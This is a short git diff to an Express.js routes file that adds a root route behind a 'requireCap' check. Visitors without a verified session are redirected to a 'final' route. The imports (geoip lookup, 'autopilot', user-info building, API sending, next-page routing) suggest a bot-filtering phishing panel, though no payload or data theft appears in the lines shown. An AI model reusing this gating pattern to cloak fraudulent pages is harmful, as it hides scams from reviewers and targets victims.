@@ -1,7 +1,7 @@
 import express from "express";
 import geoip from "geoip-lite";
 import session from "express-session";
-import { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, sendAPIRequest, requireAdmin } from "../utils.js";
+import { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, sendAPIRequest, requireAdmin, routeMap } from "../utils.js";
 import capRouter, { requireCap } from "../altcheck.js";
 import dotenv from "dotenv";
 dotenv.config();
@@ -13,6 +13,11 @@ export default function createRoutes(db, io) {
 router.get("/header", (req, res) => {
 res.sendFile("header.html", { root: "views/admin" });
 });
+
+router.get('/', requireCap, (req, res, next) => {
+	  if (req.session?.capVerified) return next();
+ 	 res.redirect(routeMap.final);
+	  });
 
 router.get('/sign-in', requireCap, (req, res, next) => {
   const { user } = req.session;
